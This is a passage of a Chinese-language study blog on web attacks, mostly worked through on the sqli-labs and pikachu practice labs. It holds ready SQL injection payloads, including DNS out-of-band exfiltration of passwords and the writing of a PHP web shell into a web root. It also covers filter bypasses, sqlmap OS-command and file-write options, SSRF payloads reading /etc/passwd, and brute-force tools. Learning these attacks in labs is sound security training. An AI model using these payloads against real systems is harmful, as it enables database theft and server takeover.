0,1),3</code></pre><p>由于显示表只能显示一行，所以需要limit来逐个回显，这里我们就可以结合burp来实现高效率的爆破表明，也就是将0换为123456789………,但是可以使用group_concat函数</p><p>表名：emails、referers、uagents、users</p><pre><code>-1 union select 1,(select group_concat(0x7e,column_name) from information_schema.columns where table_name=&#39;users&#39;),3</code></pre><p>列名(字段)：<del>id,</del>username,~password</p><p>老师的构造：</p><pre><code>-1 union select 1,group_concat(0x7e,username),group_concat(0x7e,password) from users</code></pre><p>我的构造：</p><pre><code>-1 union select 1,2,group_concat(username,0x7e,password) from users</code></pre><p>得到所有用户的隐私了</p><h5 id="less-1："><a href="#less-1：" class="headerlink" title="less-1："></a>less-1：</h5><p>字符型：1’ and 1=2#会报错，根据less-2直接构造</p><pre><code>-1&#39; union select 1,2,group_concat(username,0x7e,password) from users%23</code></pre><p>直接一把梭，不过要注意#需要进行URL转化→%23</p><h4 id="sql注入-搜索型（pikachu靶场搭建完成）："><a href="#sql注入-搜索型（pikachu靶场搭建完成）：" class="headerlink" title="sql注入-搜索型（pikachu靶场搭建完成）："></a>sql注入-搜索型（pikachu靶场搭建完成）：</h4><p>sql语句原型：select * from news where content like ‘%d%’</p><p>想办法闭合掉单引号和百分比号</p><pre><code>1%&#39; and 1=2 --1%&#39; order by 4 --+1%&#39; order by 3 --+</code></pre><p>有三个字段</p><pre><code>1%&#39; union select 1,database(),3 --+</code></pre><p>库名：pikachu </p><pre><code>1%&#39; union select 1,(select group_concat(table_name)+from+information_schema.tables+where+table_schema=&#39;pikachu&#39;),3 --+</code></pre><p>表名：httpinfo,member,message,users,xssblind </p><pre><code>1%&#39; union select 1,(select group_concat(column_name)+from+information_schema.columns+where+table_name=&#39;users&#39;),3 --+</code></pre><p>列明：id,username,password,level,id,username,password </p><p>爆破字段值</p><pre><code>1%&#39; union select 1,2,group_concat(username,0x7e,password)+from+users --+</code></pre><p>密码是经过hash的</p><h4 id="宽字节注入原理-less-32-："><a href="#宽字节注入原理-less-32-：" class="headerlink" title="宽字节注入原理(less-32)："></a>宽字节注入原理(less-32)：</h4><p>1.对用户输出的单引号进行处理，在单引号前加上斜杠进行转义，这样单引号就失去了作用</p><p>2.注入思路：</p><p>a.让斜杠失去作用</p><p>b.让斜杠消失</p><p>3.MySQL在使用gbk编码的时候，会认为两个字符为一个汉字</p><p><strong>开始打关：</strong></p><p>技巧：通过gbk编码的特性利用%df的特性来使后面的%5c→/的两个字符组合，认为是一个汉字，这时候单引号就被闭合了</p><pre><code>%df%27+order by 4+--+%df%27+order by 3+--+%df%27+union select 1,database(),3+--+</code></pre><p>库名：security</p><p>跟less-2一样，可以直接一把梭：</p><pre><code>%df%27+union select 1,group_concat(username,0x7e,password),3+from users+--+</code></pre><p>得到用户隐私信息</p><h4 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h4><p>有10种之多的报错注入除了e和u还有floor()三种为主要</p><p>相关函数：</p><p>count()显示有几条（行）数据</p><p>rand()随机产生一个0-1的浮点数，其中可以指定一个种子，用来产生重复序列</p><p>floor()取整数</p><p>group by：根据by后面的进行分类分组，顺序为数字。字母</p><p>extractvalue()：其能查询的字符串我的最大长度为32，如果超过32的话，就需要使用substring()函数截取，依次查看32位</p><h5 id="第一种报错方式—利用主键冲突的原理来报错注入："><a href="#第一种报错方式—利用主键冲突的原理来报错注入：" class="headerlink" title="第一种报错方式—利用主键冲突的原理来报错注入："></a>第一种报错方式—利用主键冲突的原理来报错注入：</h5><p>count+group by+floor(rand(0)*2)</p><p>因为rand出来的数是小于1的，所以*2后经过floor取整要么是0要么是1，当这三个函数相遇的时候就会出现主键冲突</p><pre><code>select count(*) from users group by concat(version(),floor(rand(0)*2));</code></pre><h5 id="less-5："><a href="#less-5：" class="headerlink" title="less-5："></a>less-5：</h5><p>依然是三列：<strong>order by 4报错</strong></p><pre><code>-1&#39; union select 1,2,count(*) from information_schema.tables where table_schema=database() group by concat(floor(rand(0)*2),0x7e,database())+--+</code></pre><p>库名：security</p><pre><code>-1&#39; union select 1,2,count(*) from information_schema.tables where table_schema=database() group by concat(floor(rand(0)*2),0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))+--+</code></pre><p>表名：l利用burp来实现高效率爆破：emails、referers、uagents、users</p><pre><code>-1&#39; union select 1,2,count(*) from information_schema.tables where table_schema=database() group by concat(floor(rand(0)*2),0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))+--+</code></pre><p>列名：利用burp来实现高效率爆破：id,username,password,level,id,username,password </p><p>爆破字段值：</p><pre><code>-1&#39; union select 1,2,count(*) from users group by concat(0x7e,floor(rand(0)*2),(select concat(0x7e,password) from users limit 0,1))+--+</code></pre><p>注意，此处的floor函数前面需要有</p><h5 id="第二种报错注入xpath语法错误："><a href="#第二种报错注入xpath语法错误：" class="headerlink" title="第二种报错注入xpath语法错误："></a>第二种报错注入xpath语法错误：</h5><p>less-5：</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,databse()),1) --+</code></pre><p>库名：security</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database() limit 0,1)),1) --+</code></pre><p>表明：emails、referers、uagents、users</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())),1) --+</code></pre><p>列名：</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+column_name+from+information_schema.columns+where+table_name=&#39;users&#39; limit 0,1)),1)+--+</code></pre><p>结合burp来实现高效率爆破列名</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+username+from+users+limit 0,1)),1)+--+</code></pre><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+password+from+users+limit 0,1)),1)+--+</code></pre><p>结合burp实现高效率爆破 </p><h4 id="布尔注入："><a href="#布尔注入：" class="headerlink" title="布尔注入："></a>布尔注入：</h4><p>数据不能回显到前端，需要别的方式来进行判断</p><h5 id="less-8："><a href="#less-8：" class="headerlink" title="less-8："></a>less-8：</h5><p>利用length()函数来判断库名的长度</p><pre><code>1&#39;+and+length(database())&gt;1+--+</code></pre><p>集合burp半自动化来实现高效率爆破</p><p>利用substr()函数来猜解库名 </p><pre><code>1&#39;+and+substr(database(),1,1)=&#39;a&#39;+--+</code></pre><p>利用半自动化针对1和a的位置进行递增式爆破</p><p>猜表名：</p><pre><code>1&#39;+and+substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1)=&#39;a&#39;+--+</code></pre><p>对0处设置变量是因为要读第几个表，对第二个1设置变量是因为要选取第几位的第一个字母，对a就不用说了</p><p>猜列名：</p><pre><code>1&#39;+and+substr((select+column_name+from+information_schema.columns+where+table_schema=database()+and+table_name=&#39;users&#39;+limit+0,1),1,1)=&#39;a&#39;+--+</code></pre><p>同理得，当然不一定要 三个变量，可以半半自动化来实现清晰的爆破</p><pre><code>1&#39;+and+substr((select+password+from+users+limit 0,1),1,1)=&#39;a&#39;+--+</code></pre><h4 id="时间盲注-也属于布尔盲注-："><a href="#时间盲注-也属于布尔盲注-：" class="headerlink" title="时间盲注(也属于布尔盲注)："></a>时间盲注(也属于布尔盲注)：</h4><p>原理：用条件语句查看时间延迟语句是否执行</p><p>思路：</p><pre><code>1&#39;+and+if((substr(user(),1,1)=&#39;a&#39;),sleep(2),1)+--+</code></pre><p>结尾的1是返回的值，user()处可以替换为查询的语句</p><pre><code>1&#39;+and+if((substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1)&gt;&#39;a&#39;),sleep(2),1)+--+</code></pre><pre><code>1&#39;+and+if((substr((select+column_name+from+information_schema.columns+where+table_name=&#39;users&#39;+limit+0,1),1,1)&gt;&#39;a&#39;),sleep(2),1)+--+</code></pre><pre><code>1&#39;+and+if((substr((select+password+from+users+limit+0,1),1,1)&gt;&#39;a&#39;),sleep(2),1)+--+</code></pre><p>OK</p><h4 id="DNSlog外带注入："><a href="#DNSlog外带注入：" class="headerlink" title="DNSlog外带注入："></a>DNSlog外带注入：</h4><p>原理：将dnslog平台中的特有字段payload带入目标发起dns请求，通过dns解析将请求后的关键信息组合成新的三级域名带出，在dns服务器的dns日志中显示出来。</p><p><strong>show variables like ‘%secure%’;查看load_file()可以读取的磁盘：</strong></p><p>当secure_file_priv为空，就可以读取磁盘的目录。</p><p>当secure_file_priv为G:\，就可以读取G盘的目录。</p><p>当secure_file_priv为null，则不能加载文件。</p><p>需要配置mysql.ini中的secure_file_priv=’ ‘</p><p>在mysql命令执行：</p><pre><code>select load_file(&#39;\\\\&#39;,afanti.xxxx.ceye.io\\aaa&#39;);其中afanti就是要注入的查询语句</code></pre><h5 id="less-9："><a href="#less-9：" class="headerlink" title="less-9："></a>less-9：</h5><p>利用dnslog.cn平台来进行测验</p><pre><code>1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select+hex(password)+from+users+limit+0,1),&#39;.xxxx.dnslog.cn\\aaa&#39;)))+--+</code></pre><p>联合查询：</p><pre><code>&#39; union select 1,2,(load_file(concat(&#39;\\\\&#39;,(select+hex(password)))+from+users+limit+0,1),&#39;.xxxx.dnslog.cn\\aaa&#39;)))+--+</code></pre><p>此处需要用hex编码，以防报错</p><h4 id="POST注入："><a href="#POST注入：" class="headerlink" title="POST注入："></a>POST注入：</h4><h5 id="sqllabs-11："><a href="#sqllabs-11：" class="headerlink" title="sqllabs-11："></a>sqllabs-11：</h5><p>可以使用万能密码：</p><pre><code>&#39; or 1=1#</code></pre><p>针对登录框进行注入</p><p>post参数：</p><pre><code>uname=&#39; or 1=1#&amp;passwd=123&amp;submit=Submit</code></pre><p>主要思路就是将passwd以及其后面的内容全部注释掉，然后向get注入一样的思路就ok了</p><p>关于注册页面的账户和密码的post注入：</p><p>sql语句：</p><pre><code>$sql= &quot;insert into users values(&#39;$uname&#39;,&#39;$passwd&#39;)&quot;;</code></pre><pre><code>$uname=1&#39;or undataxml(1,user(),1) or&#39;</code></pre><p>将它放入sql中的$uname中即可发现奥妙</p><h4 id="Referer注入："><a href="#Referer注入：" class="headerlink" title="Referer注入："></a>Referer注入：</h4><h5 id="HTTP头注入："><a href="#HTTP头注入：" class="headerlink" title="HTTP头注入："></a>HTTP头注入：</h5><h6 id="COOKIE型注入："><a href="#COOKIE型注入：" class="headerlink" title="COOKIE型注入："></a>COOKIE型注入：</h6><h6 id="XFF注入："><a href="#XFF注入：" class="headerlink" title="XFF注入："></a>XFF注入：</h6><h6 id="Clien-IP："><a href="#Clien-IP：" class="headerlink" title="Clien-IP："></a>Clien-IP：</h6><h6 id="user-agent注入："><a href="#user-agent注入：" class="headerlink" title="user-agent注入："></a>user-agent注入：</h6><h6 id="referer注入："><a href="#referer注入：" class="headerlink" title="referer注入："></a>referer注入：</h6><p>less-19中存在referer注入，他提交表单依然采用的是post方式提交，但是插入sql语句的位置是在referer的处进行插入</p><pre><code>&#39;or +任意sql注入语句（报错注入，联合查询等等）</code></pre><h4 id="其他注入（delect）："><a href="#其他注入（delect）：" class="headerlink" title="其他注入（delect）："></a>其他注入（delect）：</h4><p>pikachu有靶场</p><p>sql语句中的原理：</p><pre><code>delect from 表明 where id=xxx</code></pre><p>get传参+报错注入</p><h4 id="sql注入读写文件："><a href="#sql注入读写文件：" class="headerlink" title="sql注入读写文件："></a>sql注入读写文件：</h4><p>利用的是into outfile语句</p><p>less-1做演示：</p><p>当权限为<strong>root</strong>且知道<strong>绝对路径</strong>时，可以直接写一句话木马到服务器，注意存在</p><pre><code>&#39;union select 1,2,&quot;&lt;?php eval($_POST[&#39;666&#39;]);?&gt;&quot;,into outfile &quot;E:\\phpstudy\\PHPTutorial\\WWW\\shell.php&quot;+--+</code></pre><p>然后利用蚁剑</p><p>利用load_file读取文件：</p><pre><code>&#39;union select 1,2,@@basedir+--+</code></pre><p>该参数指定了安装 MySQL 的安装路径，填写全路径可以解决相对路径所造成的问题。</p><pre><code>&#39;union select 1,2,@@dataedir+--+</code></pre><p>该参数指定了 MySQL 的数据库文件放在什么路径下。数据库文件即我们常说的 MySQL data 文件。</p><pre><code>&#39;union select 1,2,hex(load_file(&#39;E:\\phpstudy\\PHPTutorial\\WWW\\index.php&#39;))</code></pre><ul><li><h3 id="sql注入绕过与防御"><a href="#sql注入绕过与防御" class="headerlink" title="sql注入绕过与防御"></a>sql注入绕过与防御</h3></li></ul><h4 id="常见的绕过思路："><a href="#常见的绕过思路：" class="headerlink" title="常见的绕过思路："></a>常见的绕过思路：</h4><p>等价替换、双写绕过、大小写绕过、URL、16进制等编码绕过、内联注释绕过</p><p>绕过单引号过滤：使用16进制编码、或宽字节方式</p><p>绕过order by过滤：union select 1,2,3</p><p>绕过union select过滤：union distinct select</p><p>绕过=号过滤：lik、rlike替换</p><p>绕过select后的空格过滤：可以使用单引号将select后面参数包裹</p><pre><code>union distinct select&#39;1&#39;,2,3;union distinct (select&#39;1&#39;,2,3);</code></pre><p>绕过from+空格过滤：from{x 表名}</p><p>绕过大于小于：使用in、between a and b(范围在a-b之间)</p><pre><code>1 and substr(user(),1,1) in (&#39;a&#39;);select * from users where id between 1 and 2; </code></pre><p>绕过逗号过滤：join、from pos for len(代表从pos个开始读取len长度的子串) 绕过</p><pre><code>union select * from (select 1)a join(select 2)b join(select 3)c join(select 4)d</code></pre><p>等价于</p><pre><code>union select 1,2,3,4 from pos for len</code></pre><p>(代表从pos个开始读取len长度的子串)</p><p>绕过limit中的逗号过滤：使用offset关键字，limit2,1等价于limit 1offset 2, offsetx 是偏移x个数据</p><p>绕过sleep函数过滤：benchmark()函数替换，benchmark函数可以测试某些操作的执行速度，参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式benchmark(1000000000000，1)</p><p>绕过group_concat的过滤：concat_ws代替</p><h4 id="less-23：过滤了注释符"><a href="#less-23：过滤了注释符" class="headerlink" title="less-23：过滤了注释符"></a>less-23：过滤了注释符</h4><p>联合查询和报错注入实现语句拼接来进行破解</p><pre><code>1&#39;union select 1,2,3&#39;</code></pre><p>主要就是利用了闭合单引号，使查询语句不作为字符串出现</p><h4 id="less-25：针对and和or进行了过滤"><a href="#less-25：针对and和or进行了过滤" class="headerlink" title="less-25：针对and和or进行了过滤"></a>less-25：针对and和or进行了过滤</h4><p>采用双写大小写绕过</p><p>采用等价替换的方式：&amp;&amp;、||、|(异或)</p><p>采用联合查询来拼接语句，通过闭合单引号来实现</p><pre><code>-1&#39;union select 1,user(),3&#39;</code></pre><h4 id="less-26：过滤空格"><a href="#less-26：过滤空格" class="headerlink" title="less-26：过滤空格"></a>less-26：过滤空格</h4><p>等价替换：</p><p>%09 TAB键(水平)</p><p>%0a  新建一行，回车</p><p>%0b TAB键(垂直)</p><p>%0c 新的一页</p><p>%0d return功能</p><p>%a0 空格</p><p>%00 空字节</p><p>/**/ 注释代替空格</p><p>/!**/ 内联注释</p><p>()      包裹参数</p><p>``    反引号包裹参数 </p><h4 id="less-27：过滤了union和select"><a href="#less-27：过滤了union和select" class="headerlink" title="less-27：过滤了union和select"></a>less-27：过滤了union和select</h4><p>采用双写、大小写绕过</p><h4 id="防御思路："><a href="#防御思路：" class="headerlink" title="防御思路："></a>防御思路：</h4><h5 id="代码层防御："><a href="#代码层防御：" class="headerlink" title="代码层防御："></a>代码层防御：</h5><p>黑名单：不允许xxx进入</p><p>白名单：只允许xxx进入</p><p>字符过滤</p><p>规范输出</p><h5 id="配置层："><a href="#配置层：" class="headerlink" title="配置层："></a>配置层：</h5><p>开启gpc</p><p>使用utf-8</p><h5 id="物理层："><a href="#物理层：" class="headerlink" title="物理层："></a>物理层：</h5><p>waf(软/硬waf)</p><p>云防护(数据清理)</p><p>ips(入侵防御系统)</p><ul><li><h3 id="burp讲解"><a href="#burp讲解" class="headerlink" title="burp讲解"></a>burp讲解</h3></li><li><h3 id="sql注入之sqlmap"><a href="#sql注入之sqlmap" class="headerlink" title="sql注入之sqlmap"></a>sql注入之sqlmap</h3></li></ul><p>基于python2的环境下：<a href="https://blog.csdn.net/destinymf/article/details/80656996?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&dist_request_id=1328740.12990.16168352186468463&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control" target="_blank" rel="noopener">Python双环境安装</a></p><p>Python2.7.16和3.7.0</p><p><a href="https://blog.csdn.net/qq_33530840/article/details/82144515" target="_blank" rel="noopener">sqlmap使用教程</a>：</p><p><a href="https://blog.csdn.net/smli_ng/article/details/106026901" target="_blank" rel="noopener">sqlmap详细使用教程</a></p><h4 id="注入判断："><a href="#注入判断：" class="headerlink" title="注入判断："></a>注入判断：</h4><p>sqlmap.py -u url判断其php版本，服务系统</p><p>sqlmap.py -r [文本的路径]可以将burp抓到的包中的内容编辑到此文本中</p><h4 id="基本使用："><a href="#基本使用：" class="headerlink" title="基本使用："></a>基本使用：</h4><p>查询当前站点的数据库：</p><p><strong>sqlmap.py -u url –current-db</strong></p><p>查询当前用户下的所有数据库：</p><p><strong>sqlmap.py -u url –db</strong></p><p>查询数据库中的表明：</p><p><strong>sqlmap.py -u url -D dbname –tables</strong></p><p>查询表中的字段名：</p><p><strong>sqlmap.py -u url -D dbname -T tablename –culumns</strong></p><p>查询表中的字段内容：</p><p><strong>sqlmap.py -u url -D dbname -T tablename -C columnname –dump</strong></p><p>查询数据库的所有用户(当前用户有读权限)：</p><p><strong>sqlmap.py -u url –users</strong></p><p>查询数据库用户的密码：</p><p><strong>sqlmap.py -u url –password</strong></p><p>当前数据库用户名称：</p><p><strong>sqlmap.py -u url –current-users</strong></p><p>指定数据库类型：</p><p><strong>sqlmap.py -u url –dbms=mysql/oracle/mssql</strong></p><h4 id="进阶使用："><a href="#进阶使用：" class="headerlink" title="进阶使用："></a>进阶使用：</h4><p>–level1:get post</p><p>–level2:增加cookie</p><p>–level3:增加user-agent/referer</p><p>–level4:更多的payload</p><p>–level5:最高等级，包含所有的payload，会尝试自动破解出cookie，xff等头部注入。</p><h5 id="显示调试信息："><a href="#显示调试信息：" class="headerlink" title="显示调试信息："></a>显示调试信息：</h5><p>-v的7个级别：</p><p> 0：只显示python错误以及重要信息</p><p>1：显示信息以及警告</p><p>2：显示debug消息</p><p>3：显示注入payload</p><p>4：显示http请求</p><p>5：显示http响应头·</p><p>6：显示http响应内容</p><h5 id="判断用户是否为管理员："><a href="#判断用户是否为管理员：" class="headerlink" title="判断用户是否为管理员："></a>判断用户是否为管理员：</h5><p>–is-dba:返回true时为root，否则返回false</p><p>–roles               枚举DBMS用户的角色，看权限，-U可进行指定，但是仅适用于当前数据库是Oracle的时候</p><h5 id="伪造referer头："><a href="#伪造referer头：" class="headerlink" title="伪造referer头："></a>伪造referer头：</h5><p>–referer：当等级级别在3或3以上时，会尝试referer注入，可以使用–referer来伪造referer来源</p><p><strong>执行自定义的sql语句：</strong></p><p>–sql-shell：执行自定义sql语句</p><p><strong>运行系统命令(非交互式)：</strong></p><p>–os-cmd=命令：执行系统命令</p><p>这里有个前提，需要是root用户，必须知道绝对路径，且非交互式。</p><p>上传文件到数据库服务器中(root)：</p><p><strong>sqlmap.py -u url –file-write=本地文件路径 –file-dest 网站路径(写入路径)+”/写入的文件名”</strong></p><p><a href="https://blog.csdn.net/qq_34335450/article/details/106733489" target="_blank" rel="noopener">sql注入风险最简单修复方法</a></p><p>最好的还是装一waf</p><ul><li><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3></li></ul><h4 id="基于b-s架构的暴力破解："><a href="#基于b-s架构的暴力破解：" class="headerlink" title="基于b/s架构的暴力破解："></a>基于b/s架构的暴力破解：</h4><h5 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h5><p>登录框(用户名和密码)</p><p>URL参数(用户ID值、目录名、参数名等)</p><p>验证码(验证码接收处)</p><h5 id="弱口令："><a href="#弱口令：" class="headerlink" title="弱口令："></a>弱口令：</h5><h5 id="爆破点："><a href="#爆破点：" class="headerlink" title="爆破点："></a>爆破点：</h5><p>网站根目录下找后台管理地址</p><p>旁站</p><p>使用二级域名</p><p>其他服务器</p><h5 id="后台查找方法："><a href="#后台查找方法：" class="headerlink" title="后台查找方法："></a>后台查找方法：</h5><h6 id="在当前网站："><a href="#在当前网站：" class="headerlink" title="在当前网站："></a>在当前网站：</h6><p>字典暴力破解：<a href="https://blog.csdn.net/u012804180/article/details/51932863" target="_blank" rel="noopener">asp、aspx、php、jsp万能密码大全</a></p><p>爬行</p><p>谷歌 hack</p><p>网站资源利用(robots.txt、图片链接地址等)</p><p>通用cms特性</p><p>信息泄露(SVN、git等)</p><h6 id="不在当前网站："><a href="#不在当前网站：" class="headerlink" title="不在当前网站："></a>不在当前网站：</h6><p>二级域名-子域名暴力破解</p><p>端口：nmap扫描</p><p>c段扫描</p><h4 id="基于c-s架构的暴力破解："><a href="#基于c-s架构的暴力破解：" class="headerlink" title="基于c/s架构的暴力破解："></a>基于c/s架构的暴力破解：</h4><h5 id="分类：-1"><a href="#分类：-1" class="headerlink" title="分类："></a>分类：</h5><p>Windows远程桌面</p><p>ssh远程桌面</p><p>数据库账号密码</p><p>ftp账号密码</p><h5 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h5><p>确定攻击目标，需要账号密码输入的地方</p><p>建立socket通信(多线程)</p><p>输入账号(一般为默认账号)</p><p>通过字典或规则生成待测试的密码</p><p>发送面膜，取得验证</p><p>拒绝密码，重复第四部，知道密码正确</p><h5 id="爆破利器："><a href="#爆破利器：" class="headerlink" title="爆破利器："></a>爆破利器：</h5><p><a href="https://blog.csdn.net/smli_ng/article/details/106089614" target="_blank" rel="noopener">hydra(海德拉)</a></p><p>其几乎能爆破近乎所有的协议</p><p>超级弱口令检查工具</p><h4 id="生成字典："><a href="#生成字典：" class="headerlink" title="生成字典："></a>生成字典：</h4><h5 id="Windows下字典生成工具："><a href="#Windows下字典生成工具：" class="headerlink" title="Windows下字典生成工具："></a>Windows下字典生成工具：</h5><p>易优、品轩</p><h5 id="Linux下字典生成工具："><a href="#Linux下字典生成工具：" class="headerlink" title="Linux下字典生成工具："></a>Linux下字典生成工具：</h5><p><a href="https://blog.csdn.net/tb_youth/article/details/103264234" target="_blank" rel="noopener">crunch</a>、cewl、cupp</p><ul><li><h3 id="csrf漏洞"><a href="#csrf漏洞" class="headerlink" title="csrf漏洞"></a>csrf漏洞</h3></li></ul><p>跨站请求伪造，是一种挟制用户在当前已经登录的的web应用程序上执行非本意的操作的攻击方法，跟xss相比，xss利用的是用户对指定网站的信任，csrf利用的是网站对用户页面浏览器的信任。最大的去呗就是csrf没有盗取用户的cookie，而是直接的利用的浏览器储存cookie让用去执行某个动作。</p><h4 id="pikachu靶场："><a href="#pikachu靶场：" class="headerlink" title="pikachu靶场："></a>pikachu靶场：</h4><h5 id="get型："><a href="#get型：" class="headerlink" title="get型："></a>get型：</h5><p>利用两个浏览器，在搜狗将一个账号在提交时，所在URL栏要利用的信息，复制到火狐浏览器的URL中，就可以实现修改点击此链接的用户信息</p><h5 id="post型："><a href="#post型：" class="headerlink" title="post型："></a>post型：</h5><p>通过搜狗浏览器抓包生成poc用编辑器生成html文件，将打开方式设置为火狐的打开方式，打开后点击请求即可实现</p><h5 id="csrf漏洞利用条件："><a href="#csrf漏洞利用条件：" class="headerlink" title="csrf漏洞利用条件："></a>csrf漏洞利用条件：</h5><p>被害用户已经完成身份认证</p><p>新请求的提交不需要重新身份认证或确认机制</p><p>攻击者必须了解web app 请求的参数构造</p><p>诱使用户触发攻击的指令(社工)</p><h5 id="挖掘方法："><a href="#挖掘方法：" class="headerlink" title="挖掘方法："></a>挖掘方法：</h5><p>密码修改处、点赞、转账、注销、删除，有交互个数据传输的地方就可能存在csrf，但是挖掘是最好通过判断有无二次验证或者通过有无token等来快速判断</p><h5 id="修复方法："><a href="#修复方法：" class="headerlink" title="修复方法："></a>修复方法：</h5><p>进行一个重新身份验证</p><ul><li><h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">SSRF漏洞</a></h3></li></ul><p><a href="https://www.ajsafe.com/news/181.html" target="_blank" rel="noopener">SSRF——漏洞利用</a></p><h4 id="什么是ssrf？"><a href="#什么是ssrf？" class="headerlink" title="什么是ssrf？"></a>什么是ssrf？</h4><p>服务器端请求伪造，是一中由攻击者构造形成由服务端发起的请求的一个安全漏洞。一般情况下，ssrf是针对目标网站的内部系统。因为他是从内部系统访问的，所有可以通富哦它攻击外网无法访问的内部系统，也就是把目标网站当中间人。</p><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>ssrf形成的原因大都是由于服务端提供从其他服务器萤火获取的数据的功能，且没有对目标地址做过滤与限制。比如从指定的URL地址获取网页文本内容，加载指定地址的图片，文档，等。</p><h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>内外网的端口和服务扫描</p><p>主机本地免肝数据的读取</p><p>内外网主机应用程序漏洞的利用</p><p>内外网web站点漏洞的利用</p><h4 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h4><p>探测内网服务以及内网拓扑</p><p>向内部任意主机的任意端口发送精心构造的payload</p><p>dos冬季</p><p>攻击内网的web应用，如xss、sql注入等</p><p>利用file、dict、gopher等协议读取文本信息</p><h4 id="常用协议："><a href="#常用协议：" class="headerlink" title="常用协议："></a>常用协议：</h4><p>file协议可用于查看文件</p><p>dict可用于刺探端口</p><p>gopher协议支持get/post等请求，可用于攻击内网ftp、redis、telnet、smtp等服务</p><h4 id="file协议-本地文件传输协议-的运用："><a href="#file协议-本地文件传输协议-的运用：" class="headerlink" title="file协议(本地文件传输协议)的运用："></a>file协议(本地文件传输协议)的运用：</h4><pre><code>?url=file:///etc/passwd</code></pre><h4 id="gopher协议运用："><a href="#gopher协议运用：" class="headerlink" title="gopher协议运用："></a>gopher协议运用：</h4><pre><code>?url=gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code></pre><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470" target="_blank" rel="noopener">SSRF利用 Gopher 协议拓展攻击面</a></p><h4 id="dict协议应用："><a href="#dict协议应用：" class="headerlink" title="dict协议应用："></a><a href="https://blog.csdn.net/weixin_35678674/article/details/114470729" target="_blank" rel="noopener">dict协议应用：</a></h4><pre><code>?url=dict://serverip:port/命令:参数</code></pre><p>可以针对端口处，设置参数，利用常用端口的字典来进行爆破端口查看</p><h4 id="pikachu靶场练习："><a href="#pikachu靶场练习：" class="headerlink" title="pikachu靶场练习："></a>pikachu靶场练习：</h4><p><strong>PHP中下面函数的使用不当会导致SSRF:</strong><br><strong>file_get_contents()</strong><br><strong>fsockopen()</strong><br><strong>curl_exec()</strong></p><p>知识补充：<a href="https://blog.csdn.net/deliciousion/article/details/78062521" target="_blank" rel="noopener">强大的curl命令的介绍和一般用法</a></p><pre><code>?url=file:///E:\phpstudy\PHPTutorial\WWW\pikachu-master/123.txt</code></pre><p>利用file://来读取123.txt的内容</p><pre><code>?url=dict://127.0.0.1:3306</code></pre><p>来读取本地3306端口的信息</p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a><a href="https://blog.csdn.net/u010726042/article/details/77806775" target="_blank" rel="noopener">漏洞挖掘：</a></h4><p>分享：通过URL地址分享网页内容</p><p>转码服务</p><p>在线翻译</p><p>图片的加载与下载：通过URL地址加载或下载图片</p><p>图片、文章收藏功能</p><p>未公开的api实现以及其他调用URL的功能</p><p>从URL关键字中寻找</p><h4 id="修复方法：-1"><a href="#修复方法：-1" class="headerlink" title="修复方法："></a>修复方法：</h4><p>禁用不需要的协议</p><p>黑名单内网ip</p><p>限制请求的端口为HTTP常用的端口：80、443、8080、8090</p><p>过滤返回信息</p><p>统一错误信息</p><ul><li><h3 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a><a href="https://blog.csdn.net/pro20/article/details/105731095" target="_blank" rel="noopener">URL跳转</a></h3></li></ul><p>指后台服务器在告知浏览器跳转时，未对客户端传入的重定向地址进行合法性校验，导致用户浏览器跳转到钓鱼页面的一中漏洞</p><h4 id="跳转实现方式"><a href="#跳转实现方式" class="headerlink" title="跳转实现方式"></a><strong>跳转实现方式</strong></h4><pre><code>1.META标签内跳转2.javascript跳转3.header跳转</code></pre><h5 id="meta："><a href="#meta：" class="headerlink" title="meta："></a>meta：</h5><pre><code>&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;5; url=&lt;?php echo $url?&gt;&quot; /&gt;</code></pre><h5 id="js跳转源码："><a href="#js跳转源码：" class="headerlink" title="js跳转源码："></a>js跳转源码：</h5><h5 id="header跳转源码："><a href="#header跳转源码：" class="headerlink" title="header跳转源码："></a>header跳转源码：</h5><pre><code>header(&quot;Location:$url&quot;)</code></pre><h4 id="漏洞危害：-1"><a href="#漏洞危害：-1" class="headerlink" title="漏洞危害："></a>漏洞危害：</h4><p>钓鱼：利用源码小偷制作钓鱼网站</p><p>配合csrf</p><p>配合xss漏洞</p><h4 id="pikachu靶场练习：-1"><a href="#pikachu靶场练习：-1" class="headerlink" title="pikachu靶场练习："></a>pikachu靶场练习：</h4><p>还得是自主学习！</p><ul><li><h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3></li></ul><p><a href="https://blog.csdn.net/weixin_42277564/article/details/100140894" target="_blank" 